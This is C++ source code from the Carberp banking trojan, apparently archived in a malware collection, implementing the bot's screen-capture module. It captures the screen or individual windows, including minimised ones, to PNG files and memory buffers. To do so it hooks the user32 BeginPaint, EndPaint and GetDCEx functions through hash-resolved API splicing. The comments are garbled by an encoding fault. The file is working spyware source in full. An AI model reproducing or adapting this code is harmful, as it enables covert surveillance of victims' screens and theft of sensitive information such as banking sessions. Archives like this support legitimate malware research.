/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include "ScreenShots.h"

#include "gdiplus.h"

#include "GetApi.h"
#include "Memory.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Splice.h"
#include "Unhook.h"


//---------------------------------------------------------------------------
static void SaveScreenShotToPng( HBITMAP bmp, PWCHAR FileName )
{
    static const GUID png = {0x557cf406,0x1a04,0x11d3,{0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e}};
	using namespace Gdiplus;
    ULONG_PTR token;
	GdiplusStartupInput input;
 
    m_memset( &input, 0, sizeof(input) );
	input.GdiplusVersion=1;

	pGdiplusStartup(&token, &input,0);

	GpBitmap* hGdiImg;
//	DllExports::GdipCreateBitmapFromHBITMAP( bmp, NULL, &hGdiImg);
//	DllExports::GdipSaveImageToFile( hGdiImg, FileName, (CLSID*)&png, NULL);
//	DllExports::GdipDisposeImage(hGdiImg);
	pGdipCreateBitmapFromHBITMAP( bmp, NULL, &hGdiImg);
	pGdipSaveImageToFile(hGdiImg, FileName, (CLSID*)&png, NULL);
	pGdipDisposeImage(hGdiImg);
	pGdiplusShutdown(token);
}

void ScreenShotDrawCursor(HDC DC, int ImgX, int ImgY, PDrawCursorInfo DrawCursor)
{
	// ������� ������������ ������ �� ���������
	RECT R;

	int W2 = DrawCursor->PointWidth / 2;
	int X = DrawCursor->X - ImgX;
	int Y = DrawCursor->Y - ImgY;

	R.left   = X - W2;
	R.top    = Y - W2;
	R.right  = X + W2;
	R.bottom = Y + W2;

    HBRUSH Brush=(HBRUSH)pCreateSolidBrush(DrawCursor->Color);

    pFillRect(DC,&R, Brush);

	pDeleteObject(Brush);

}


bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
					   PDrawCursorInfo DrawCursor, PWCHAR FileName)
{
	if (STRW::IsEmpty(FileName))
		return false;

	static const GUID png = {0x557cf406,0x1a04,0x11d3,{0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e}};

	// �������� �������� ����
	HDC DC = (HDC)pGetWindowDC(Wnd);
	if (DC == NULL) return false;

	// �������� ������� ����
	RECT Rect;
    ClearStruct(Rect);
	if (Wnd != NULL)
		pGetWindowRect(Wnd, &Rect);
	else
	if (Width == 0 || Height == 0)
	{
		Rect.right  = (long)pGetDeviceCaps(DC, HORZRES);
		Rect.bottom = (long)pGetDeviceCaps(DC, VERTRES);
	}

	if (Width == 0)
		Width = Rect.right - Rect.left;
	if (Height == 0)
		Height = Rect.bottom - Rect.top;

	// ������������ ����
	HBITMAP Bitmap = (HBITMAP)pCreateCompatibleBitmap(DC, Width, Height);
	HDC CompDC = (HDC)pCreateCompatibleDC(DC);
	pSelectObject(CompDC, Bitmap);
	pBitBlt(CompDC, 0, 0, Width, Height, DC, X , Y, SRCCOPY);

	// ������������ ������
//    HCURSOR hArrow=(HCURSOR)pLoadCursorW(NULL,IDC_ARROW);
//
//    ICONINFO iconinfo={0};
//    pGetIconInfo(hArrow,&iconinfo);
//    pDrawIcon(hCompDC,SSHOT_WIDTH/2-iconinfo.xHotspot,SSHOT_HEIGHT/2-iconinfo.yHotspot,hArrow);
//    pDeleteObject(hArrow);

	// ������ �������
//    rect.top=0;
//    rect.right=0;
//    rect.left=SSHOT_WIDTH;
//    rect.bottom=SSHOT_HEIGHT;
//    pSetTextColor(hCompDC,0x0);
//    pSetBkColor(hCompDC,0xFFFFFF);
//    pDrawTextA(hCompDC,lpUrl,-1,&rect,DT_BOTTOM+DT_SINGLELINE+DT_CENTER);

	// ������������ ������
	if (DrawCursor != NULL)
		ScreenShotDrawCursor(CompDC, X, Y, DrawCursor);


	pDeleteDC(CompDC);


    // ��������� �������� � ����
	SaveScreenShotToPng( Bitmap, FileName );

	pDeleteObject(Bitmap);
	pReleaseDC(Wnd, DC);

	return true;
}
//---------------------------------------------------------------------------

bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
		  PDrawCursorInfo DrawCursor, PCHAR FileName)
{

	PWCHAR FN = AnsiToUnicode(FileName, 0);

    bool R = Make(Wnd, X, Y, Width, Height, DrawCursor, FN);

	MemFree(FN);

	return R;
}
//---------------------------------------------------------------------------

//------------------------------------------------------
//  CaptureScreen - ������� ������ �������� ������
//------------------------------------------------------
bool ScreenShot::CaptureScreenA(PCHAR  FileName)
{
	return Make(NULL, 0, 0, 0, 0, NULL, FileName);
}
//---------------------------------------------------------------------------

bool ScreenShot::CaptureScreenW(PWCHAR FileName)
{
	return Make(NULL, 0, 0, 0, 0, NULL, FileName);
}
//---------------------------------------------------------------------------

bool ScreenShot::MakeToMem(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
						   PDrawCursorInfo DrawCursor, LPBYTE &OutData, DWORD &OutDataSize)
{
	OutData = NULL;
    OutDataSize = 0;

	PWCHAR FileName = GetTempName();
	if (FileName == NULL) return false;

	// ������ ������
	bool Result = Make(Wnd, X, Y, Width, Height, DrawCursor, FileName);
	if (Result)
	{
		OutData = File::ReadToBufferW(FileName, OutDataSize);
		Result = OutDataSize != 0;
    }

	// ������� ��������� ����
    pDeleteFileW(FileName);
	MemFree(FileName);
	return true;
}

/*
void DbgMsg(const char *format, ...)
{
	char buf[512];
	va_list mylist;

	va_start(mylist, format);
	wvsprintf(buf, format, mylist);
	va_end(mylist);
}
*/

/******************************************************************************************************/
// ������ ��������� ������� ����

typedef HDC (WINAPI* typeBeginPaint)( HWND hwnd, LPPAINTSTRUCT lpPaint );
typedef BOOL (WINAPI* typeEndPaint)( HWND hWnd, CONST PAINTSTRUCT *lpPaint );
typedef HDC (WINAPI* typeGetDCEx)( HWND hWnd, HRGN hrgnClip, DWORD flags );

const DWORD Hash_BeginPaint = 0x69F5D020;
const DWORD Hash_EndPaint = 0xCB1CC51;
const DWORD Hash_GetDCEx = 0x4891FDD7;

typeBeginPaint Real_BeginPaint;
typeEndPaint Real_EndPaint;
typeGetDCEx Real_GetDCEx;

static HWND wndScreenShot = 0;
static HDC dcScreenShot = 0;
static RECT wndRect;

//static int abcd = 0;

//��� ���������� ���������� ����� ������� BeginPaint � EndPaint
struct DCScrShot
{
	HWND wnd;
	HDC dc;
	HDC dcOriginal;
	HBITMAP oldBmp;
};

const int MaxDCSaved = 20;
static DCScrShot* dcSaved = 0;

//������� ����������� ��������� ��� ���� ��� ���� ��������� ������ (wnd == 0)
DCScrShot* GetSavedDC( HWND wnd )
{
	for( int i = 0; i < MaxDCSaved; i++ )
		if( dcSaved[i].wnd == wnd )
			return &dcSaved[i];
	return 0;
}

//���������� �������� ���������� ���������� �������
static void GetScreenClientRect( HWND wnd, RECT* r )
{
	pGetClientRect( wnd, r );
	POINT p;
	p.x = r->left;
	p.y = r->top;
	pClientToScreen( wnd, &p );
	r->left += p.x;
	r->right += p.x;
	r->top += p.y;
	r->bottom += p.y;
}

//������ �������� ������� �� ��������� ��� ������ ��������, NC - ��� ������������ �������
static void DrawSavedDC( bool NC, HWND wnd, HDC dc, int x, int y, int w, int h )
{
	RECT r;
	if( NC )
		pGetWindowRect( wnd, &r );
	else
		GetScreenClientRect( wnd, &r );
	pBitBlt( dcScreenShot, r.left - wndRect.left, r.top - wndRect.top, w, h, dc, x, y, SRCCOPY );
}

static void FillBackground( HWND hWnd, HDC dc )
{
	HBRUSH brush = (HBRUSH)pGetClassLongA( hWnd, GCL_HBRBACKGROUND ); //���� ����
	RECT r;
	pGetWindowRect( hWnd, &r );
	r.right -= r.left;
	r.bottom -= r.top;
	r.left = 0;
	r.top = 0;
	pFillRect( dc, &r, brush );
}

//�������� ������� BeginPaint
static HDC WINAPI HookBeginPaint( HWND hwnd, LPPAINTSTRUCT lpPaint )
{
	HDC dc = Real_BeginPaint( hwnd, lpPaint );
	if( dcScreenShot ) //� ������ ���������
	{
		DCScrShot* dss = GetSavedDC(0); //���� ��������� ������
		if( dss )
		{
			dss->wnd = hwnd; //��������� ���������
			dss->dcOriginal = dc;
			dss->dc = (HDC)pCreateCompatibleDC(dc); //������� ����� ����������� ����������
			pGetClientRect( hwnd, &lpPaint->rcPaint );
			int h = lpPaint->rcPaint.bottom - lpPaint->rcPaint.top;
			int w = lpPaint->rcPaint.right - lpPaint->rcPaint.left;
			//DbgMsg( "   %d (%d,%d)", abcd, w, h );
			HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, w, h );
			dss->oldBmp = (HBITMAP)pSelectObject( dss->dc, bmp ); 
			RECT r;
			GetScreenClientRect( hwnd, &r );
			BitBlt( dss->dc, 0, 0, w, h, dcScreenShot, r.left - wndRect.left, r.top - wndRect.top, SRCCOPY );
			lpPaint->hdc = dss->dc; //��������� �� ����
		}
	}
	return lpPaint->hdc;
}

//�������� ��������� ��������� ������� WM_PAINT
static BOOL WINAPI HookEndPaint( HWND hWnd, CONST PAINTSTRUCT *lpPaint )
{
	if( dcScreenShot )
	{
		DCScrShot* dss = GetSavedDC(hWnd); //���� ����������� ������
		if( dss )
		{ 
			int h = lpPaint->rcPaint.bottom - lpPaint->rcPaint.top;
			int w = lpPaint->rcPaint.right - lpPaint->rcPaint.left;
			//������������� �� ��� ��������� ������� � ��� ��������
			DrawSavedDC( false, hWnd, lpPaint->hdc, lpPaint->rcPaint.left, lpPaint->rcPaint.top, w, h );
			((PAINTSTRUCT*)lpPaint)->hdc = dss->dcOriginal;
			HBITMAP bmp = (HBITMAP) pSelectObject( dss->dc, dss->oldBmp );
			/*
		wchar_t file[MAX_PATH];
		RECT r;
		GetScreenClientRect( hWnd, &r );
		DbgMsg( "   %d (%d,%d,%d,%d)", abcd, r.left - wndRect.left, r.top - wndRect.top, w, h );
		wsprintfW( file, L"c:\\temp\\%03d.png", abcd++ );
		SaveScreenShotToPng( bmp, file );
		*/
			pDeleteObject(bmp);
			pReleaseDC( hWnd, dss->dc );
			dss->wnd = 0;
		}
	}
	return Real_EndPaint( hWnd, lpPaint );
}

//������������� ��� ��������� ������� WM_NCPAINT
static HDC WINAPI HookGetDCEx( HWND hWnd, HRGN hrgnClip, DWORD flags )
{
	if( dcScreenShot )
	{
		if( hWnd ==	wndScreenShot ) //�������� �� ���������� ������� ��������� ����
		{
			return dcScreenShot;
		}
		else
		{
			DCScrShot* dss = GetSavedDC(0); //���� ��������� ������
			if( dss )
			{
				dss->wnd = hWnd; //��������� ���������
				HDC dc = (HDC)pGetDC(hWnd);
				dss->dc = (HDC)pCreateCompatibleDC(dc); //������� ����� ����������� ����������
				RECT r;
				pGetWindowRect( hWnd, &r );
				int h = r.bottom - r.top;
				int w = r.right - r.left; 
				HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, w, h );
				dss->oldBmp = (HBITMAP)pSelectObject( dss->dc, bmp ); 
				BitBlt( dss->dc, 0, 0, w, h, dcScreenShot, r.left - wndRect.left, r.top - wndRect.top, SRCCOPY );
				pReleaseDC( hWnd, dc );
				return dss->dc;
			}
		}
	}
	return Real_GetDCEx( hWnd, hrgnClip, flags );
}

//�������� ������� �������� �����, ����� �������������� �� ����� ���������
static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	if( pIsWindowVisible(hwnd) )
	{
		pSendMessageA( hwnd, WM_NCPAINT, WPARAM(1), 0 );
		DCScrShot* dss = GetSavedDC(hwnd); //���� ����������� ������
		if( dss ) 
		{ 
			RECT r;
			pGetWindowRect( hwnd, &r );
			int h = r.bottom - r.top;
			int w = r.right - r.left;
			//������������� �� ��� ��������� ������� � ��� ��������
			DrawSavedDC( true, hwnd, dss->dc, 0, 0, w, h );
			HBITMAP bmp = (HBITMAP) pSelectObject( dss->dc, dss->oldBmp );
			/*
		wchar_t file[MAX_PATH];
		DbgMsg( "NC %d (%d,%d,%d,%d)", abcd, r.left - wndRect.left, r.top - wndRect.top, w, h );
		wsprintfW( file, L"c:\\temp\\%03d.png", abcd++ );
		SaveScreenShotToPng( bmp, file );
		*/
			pDeleteObject(bmp);
			pReleaseDC( hwnd, dss->dc );
			dss->wnd = 0;
		}
		pSendMessageA( hwnd, WM_PAINT, 0, 0 );
	}
	return TRUE;
}
 
//����������� ������� ��� ������ ��������� � �������� ����
bool ScreenShot::DrawWindow( HWND Wnd, PWCHAR FileName )
{
	//pSendMessageA( Wnd, WM_NCACTIVATE, true, NULL );
	//��������� �������� �� ������� ����� ���������� ��������
    HDC dcMem = (HDC)pCreateCompatibleDC(NULL);
	if( pIsIconic(Wnd) ) //���� ���� ��������, �� ��� ������� ���������� ������ ��������
	{
		WINDOWPLACEMENT wp;
		wp.length = sizeof(wp);
		pGetWindowPlacement( Wnd, &wp );
		wndRect.left = wp.rcNormalPosition.left;
		wndRect.top = wp.rcNormalPosition.top;
		wndRect.right = wp.rcNormalPosition.right;
		wndRect.bottom = wp.rcNormalPosition.bottom;
	}
	else
		pGetWindowRect( Wnd, &wndRect);
    HDC dc = (HDC)pGetDC(Wnd);
    HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, wndRect.right - wndRect.left, wndRect.bottom - wndRect.top ); //� ���� bitmap ����� ��� ��������
    pReleaseDC( Wnd, dc );

    HGDIOBJ old = pSelectObject( dcMem, bmp );

	//������������� ����������
	wndScreenShot = Wnd; 
	dcScreenShot = dcMem;
	dcSaved = (DCScrShot*)HEAP::Alloc( sizeof(DCScrShot) * MaxDCSaved );

	//��������� ����� �������� ����
	FillBackground( Wnd, dcMem );

	//������
	if( !HookApi( DLL_USER32, Hash_BeginPaint, HookBeginPaint, &Real_BeginPaint ) ) return false;
	if( !HookApi( DLL_USER32, Hash_EndPaint, HookEndPaint, &Real_EndPaint ) ) return false;
	if( !HookApi( DLL_USER32, Hash_GetDCEx, HookGetDCEx, &Real_GetDCEx ) ) return false;

	//������� ������� ��������� ����
	pSendMessageA( Wnd, WM_NCPAINT, WPARAM(1), 0 );
	pSendMessageA( Wnd, WM_PAINT, 0, 0 );
	//������� ������� �������� �����
	pEnumChildWindows( Wnd, EnumChildProc, 0 );

	//����������� �������
	wndScreenShot = 0;
	dcScreenShot = 0;
	HEAP::Free(dcSaved);
	dcSaved = 0;
	UnhookBeginEndPaint();

    pSelectObject( dcMem, old );
    pDeleteObject( dcMem );

	SaveScreenShotToPng( bmp, FileName );

	pDeleteObject(bmp);

	return true;
}

bool ScreenShot::DrawWindow(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
{
	OutData = NULL; 
    OutDataSize = 0;

	PWCHAR FileName = GetTempName();
	if (FileName == NULL) return false;

	// ������ ������
	bool Result = DrawWindow( Wnd, FileName );
	if (Result)
	{
		OutData = File::ReadToBufferW(FileName, OutDataSize);
		Result = OutDataSize != 0;
    }

	// ������� ��������� ����
    pDeleteFileW(FileName);
	MemFree(FileName);
	return true;
}

bool ScreenShot::DrawWindow2( HWND Wnd, PWCHAR FileName )
{
	pSendMessageA( Wnd, WM_NCACTIVATE, true, NULL );
	//��������� �������� �� ������� ����� ���������� ��������
    HDC dcMem = (HDC)pCreateCompatibleDC(NULL);
	RECT r;
    pGetWindowRect( Wnd, &r);
    HDC dc = (HDC)pGetDC(Wnd);
    HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, r.right - r.left, r.bottom - r.top ); //� ���� bitmap ����� ��� ��������
    pReleaseDC( Wnd, dc );
    HGDIOBJ old = pSelectObject( dcMem, bmp );

	PrintWindow( Wnd, dcMem, 0 );

	pSelectObject( dcMem, old );
    pDeleteObject( dcMem );

	SaveScreenShotToPng( bmp, FileName );

	pDeleteObject(bmp);

	return true;
}

bool ScreenShot::DrawWindow2(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
{
	OutData = NULL; 
    OutDataSize = 0;

	PWCHAR FileName = GetTempName();
	if (FileName == NULL) return false;

	// ������ ������
	bool Result = DrawWindow2( Wnd, FileName );
	if (Result)
	{
		OutData = File::ReadToBufferW(FileName, OutDataSize);
		Result = OutDataSize != 0;
    }

	// ������� ��������� ����
    pDeleteFileW(FileName);
	MemFree(FileName);
	return true;
}

